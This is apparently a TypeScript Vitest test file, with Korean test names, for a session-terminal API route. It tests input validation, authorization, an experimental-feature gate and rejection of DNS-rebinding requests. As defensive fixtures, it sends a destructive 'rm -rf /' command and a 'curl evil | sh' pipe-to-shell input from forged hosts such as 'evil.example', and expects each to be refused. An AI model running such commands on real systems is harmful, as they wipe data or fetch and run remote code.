import { beforeEach, describe, expect, it, vi } from 'vitest';
import { StudioError } from '@/lib/server/errors';

const mocks = vi.hoisted(() => ({
  authorizeSession: vi.fn(async () => {}),
  sessionTerminalTarget: vi.fn((): { sandboxId: string; root: string; projectId: string } => ({ sandboxId: 'studio-orders-abc123', root: '/work/orders', projectId: 'orders' })),
  openSessionTerminal: vi.fn(async () => {}),
  writeSessionTerminal: vi.fn(),
  resizeSessionTerminal: vi.fn(async () => {}),
  closeSessionTerminal: vi.fn(),
  subscribeSessionTerminal: vi.fn(() => () => {}),
}));

vi.mock('@/lib/server/access', () => ({ requireUser: () => 'kim', authorizeSession: mocks.authorizeSession }));
vi.mock('@/lib/server/sessions', () => ({ recoverSessions: async () => {}, sessionTerminalTarget: mocks.sessionTerminalTarget }));
vi.mock('@/lib/server/session-terminal', () => ({
  MAX_TERMINAL_INPUT: 256 * 1024,
  openSessionTerminal: mocks.openSessionTerminal,
  writeSessionTerminal: mocks.writeSessionTerminal,
  resizeSessionTerminal: mocks.resizeSessionTerminal,
  closeSessionTerminal: mocks.closeSessionTerminal,
  subscribeSessionTerminal: mocks.subscribeSessionTerminal,
}));

import { GET, POST } from './route';

const context = { params: Promise.resolve({ id: 's1' }) };
const post = (body: unknown, host = '127.0.0.1:3000'): Promise<Response> =>
  POST(new Request('http://localhost/api/sessions/s1/terminal', { method: 'POST', headers: { host }, body: typeof body === 'string' ? body : JSON.stringify(body) }), context);

beforeEach(() => {
  for (const mock of Object.values(mocks)) mock.mockClear();
  mocks.authorizeSession.mockImplementation(async () => {});
  mocks.sessionTerminalTarget.mockImplementation(() => ({ sandboxId: 'studio-orders-abc123', root: '/work/orders', projectId: 'orders' }));
});

describe('POST /api/sessions/[id]/terminal (이슈 #673)', () => {
  it('열기·입력·크기·닫기를 세션의 터미널에 그대로 넘긴다', async () => {
    expect((await post({ action: 'open', cols: 120, rows: 40 })).status).toBe(200);
    expect(mocks.openSessionTerminal).toHaveBeenCalledWith('s1', { sandboxId: 'studio-orders-abc123', root: '/work/orders', projectId: 'orders' }, { action: 'open', cols: 120, rows: 40 });
    expect((await post({ action: 'input', data: '안녕\r' })).status).toBe(200);
    expect(mocks.writeSessionTerminal).toHaveBeenCalledWith('s1', '안녕\r');
    expect((await post({ action: 'resize', cols: 80, rows: 24 })).status).toBe(200);
    expect(mocks.resizeSessionTerminal).toHaveBeenCalledWith('s1', { action: 'resize', cols: 80, rows: 24 });
    expect((await post({ action: 'close' })).status).toBe(200);
    expect(mocks.closeSessionTerminal).toHaveBeenCalledWith('s1');
  });

  it('모양이 틀린 요청은 받지 않는다', async () => {
    for (const body of [{ action: 'exec', command: 'rm -rf /' }, { action: 'input' }, { action: 'input', data: '' }, { action: 'open', cols: '80', rows: 24 }, { action: 'resize', cols: 80.5, rows: 24 }, 'not json', {}]) {
      const response = await post(body);
      expect(response.status, JSON.stringify(body)).toBe(400);
    }
    expect(mocks.writeSessionTerminal).not.toHaveBeenCalled();
    expect(mocks.openSessionTerminal).not.toHaveBeenCalled();
  });

  it('쓸 수 없는 서버(실험 기능이 꺼졌거나 개인 PC 모드가 아님)에서는 열지도 입력하지도 못한다', async () => {
    mocks.sessionTerminalTarget.mockImplementation(() => {
      throw new StudioError(403, '세션 터미널은 실험 기능을 켠 개인 PC 모드에서만 씁니다(B_STUDIO_EXPERIMENTAL=1)');
    });
    for (const body of [{ action: 'open', cols: 80, rows: 24 }, { action: 'input', data: 'ls\r' }]) {
      const response = await post(body);
      expect(response.status).toBe(403);
    }
    expect(mocks.openSessionTerminal).not.toHaveBeenCalled();
    expect(mocks.writeSessionTerminal).not.toHaveBeenCalled();
    // 출력 통로도 열지 않는다
    const stream = await GET(new Request('http://localhost/api/sessions/s1/terminal', { headers: { host: 'localhost:3000' } }), context);
    expect(stream.status).toBe(403);
    expect(mocks.subscribeSessionTerminal).not.toHaveBeenCalled();
  });

  it('이 컴퓨터의 주소가 아닌 Host로 온 요청은 받지 않는다(DNS 리바인딩: 다른 사이트의 도메인이 127.0.0.1로 풀려 같은 출처로 보이는 경우)', async () => {
    for (const host of ['evil.example:3000', 'evil.example', '127.0.0.1.evil.example:3000', 'localhost.evil.example', '192.168.0.10:3000', '']) {
      expect((await post({ action: 'input', data: 'curl evil | sh\r' }, host)).status, host).toBe(403);
      expect((await GET(new Request('http://localhost/api/sessions/s1/terminal', { headers: { host } }), context)).status, host).toBe(403);
    }
    // 스크립트가 바꿀 수 있는 x-forwarded-host로는 속이지 못한다
    const forged = await POST(new Request('http://localhost/api/sessions/s1/terminal', { method: 'POST', headers: { host: 'evil.example:3000', 'x-forwarded-host': '127.0.0.1:3000' }, body: JSON.stringify({ action: 'input', data: 'x' }) }), context);
    expect(forged.status).toBe(403);
    expect(mocks.writeSessionTerminal).not.toHaveBeenCalled();
    expect(mocks.subscribeSessionTerminal).not.toHaveBeenCalled();
    expect(mocks.authorizeSession).not.toHaveBeenCalled();
    for (const host of ['127.0.0.1:3000', 'localhost:3000', 'LOCALHOST', '[::1]:3000']) expect((await post({ action: 'close' }, host)).status, host).toBe(200);
  });

  it('세션을 바꿀 권한이 없으면 거절한다', async () => {
    mocks.authorizeSession.mockRejectedValue(new StudioError(403, '이 세션을 바꿀 권한이 없습니다'));
    expect((await post({ action: 'input', data: 'ls\r' })).status).toBe(403);
    expect(mocks.sessionTerminalTarget).not.toHaveBeenCalled();
    expect(mocks.writeSessionTerminal).not.toHaveBeenCalled();
  });

  it('출력은 SSE로 흘리고, 연결이 끊기면 구독을 푼다', async () => {
    const unsubscribe = vi.fn();
    mocks.subscribeSessionTerminal.mockImplementation(((_id: string, listener: (message: unknown) => void) => {
      listener({ kind: 'data', data: 'aGk=' });
      return unsubscribe;
    }) as never);
    const controller = new AbortController();
    const response = await GET(new Request('http://localhost/api/sessions/s1/terminal', { headers: { host: '[::1]:3000' }, signal: controller.signal }), context);
    expect(response.headers.get('content-type')).toContain('text/event-stream');
    const reader = response.body!.getReader();
    const { value } = await reader.read();
    expect(new TextDecoder().decode(value)).toBe('data: {"kind":"data","data":"aGk="}\n\n');
    controller.abort();
    expect(unsubscribe).toHaveBeenCalledTimes(1);
  });
});
